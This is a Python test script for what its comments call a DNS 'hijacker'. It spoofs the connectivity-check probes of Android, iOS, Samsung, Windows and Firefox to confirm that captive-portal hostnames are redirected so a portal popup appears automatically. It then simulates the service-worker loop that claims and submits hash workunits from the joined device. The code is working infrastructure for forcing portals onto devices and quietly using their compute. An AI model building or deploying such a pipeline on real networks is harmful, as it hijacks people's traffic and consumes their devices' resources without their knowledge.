"""
Phone CPD probe simulator -- pretend to be an Android phone joining WiFi
and walk the full Aggressive Mode pipeline as that phone would.

This is the SAME network path a real phone follows; only the user-agent
+ source IP differ. Use to verify end-to-end before testing with real
family phones.
"""
import socket, struct, sys, time, json
import urllib.request

OUR_DNS = "192.168.0.22"   # our hijacker
PROBES = [
    ("Android 14",     "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
     "connectivitycheck.gstatic.com", "/generate_204"),
    ("iOS 17",         "CaptiveNetworkSupport-481.0.1 wispr",
     "captive.apple.com",            "/hotspot-detect.html"),
    ("Samsung One UI", "Mozilla/5.0 (Linux; Android 14; SM-S928N)",
     "connectivitycheck.samsung.com","/"),
    ("Windows 11",     "Microsoft NCSI",
     "www.msftconnecttest.com",      "/connecttest.txt"),
    ("Firefox",        "Mozilla/5.0 (Mobile; Firefox)",
     "detectportal.firefox.com",      "/success.txt"),
]

def dns_query(name, server=OUR_DNS):
    """Send an A query for `name` to `server` and parse first A record."""
    txid = b"\x12\x34"; flags = b"\x01\x00"
    qd = b"\x00\x01"; an = ns = ar = b"\x00\x00"
    body = b""
    for part in name.split("."):
        body += bytes([len(part)]) + part.encode()
    body += b"\x00\x00\x01\x00\x01"
    pkt = txid + flags + qd + an + ns + ar + body
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
    s.sendto(pkt, (server, 53))
    data, _ = s.recvfrom(1500); s.close()
    # Walk past question
    pos = 12
    while data[pos] != 0: pos += 1 + data[pos]
    pos += 5  # null + qtype + qclass
    # First answer: name(2) type(2) class(2) ttl(4) rdlen(2) rdata
    pos += 2 + 2 + 2 + 4 + 2
    return ".".join(str(b) for b in data[pos:pos+4])

def cpd_probe(label, ua, host, path):
    print(f"\n=== {label} ===")
    try:
        ip = dns_query(host)
    except Exception as e:
        print(f"  [!] DNS query failed: {e}"); return
    print(f"  DNS  {host} -> {ip}  ", end="")
    if ip == OUR_DNS:
        print("HIJACKED")
    else:
        print(f"(forwarded -- got real IP)")

    # Now do the HTTP CPD probe against the IP DNS returned
    url = f"http://{ip}{path}"
    req = urllib.request.Request(url, headers={"User-Agent": ua, "Host": host})
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            status = resp.status
            body = resp.read(200)
    except Exception as e:
        print(f"  HTTP fail: {e}"); return
    print(f"  HTTP {url}  -> {status}  ({len(body)}B body)")
    snippet = body.decode("utf-8", errors="replace").replace("\n", " ")[:120]
    print(f"  body: {snippet}")
    if status == 204 or b"Microsoft NCSI" in body or b"Success" in body or b"<HTML>" in body or b"OK" in body[:5]:
        print(f"  --> phone OS would conclude 'internet OK' (no popup)")
    else:
        print(f"  --> phone OS sees captive portal -> POPUP fires automatically")

print(f"simulating CPD probes from 5 different phone OS types via our DNS {OUR_DNS}\n")
for p in PROBES:
    cpd_probe(*p)

# Finally, simulate the user tapping the portal -> SW would register +
# the worker loop would start.  We replay one /work/claim + /work/submit
# round trip directly.
print("\n=== simulated user tap on portal: 3 workunits ===")
for i in range(3):
    j = json.loads(urllib.request.urlopen(
        urllib.request.Request(
            f"http://{OUR_DNS}/v1/claim/portal/work/claim", method="POST",
            data=b""),
        timeout=5).read())
    task = j["task"]
    # FNV-1a in pure python
    h = 0x811c9dc5
    for c in task["payload"]:
        h ^= ord(c); h = (h * 16777619) & 0xffffffff
    for k in range(task.get("iters", 5000)):
        h = (h * 2654435761) & 0xffffffff
        h ^= (h >> 13)
        h = ((h + k) ^ ord(task["payload"][k % len(task["payload"])])) & 0xffffffff
    hex_ = f"{h:08x}"
    sub = urllib.request.urlopen(
        urllib.request.Request(
            f"http://{OUR_DNS}/v1/claim/portal/work/submit", method="POST",
            data=json.dumps({"id": task["id"], "hex": hex_, "ms": 10}).encode(),
            headers={"Content-Type": "application/json"}),
        timeout=5).read()
    print(f"  {task['id']} -> {hex_}  (server: {sub.decode()})")
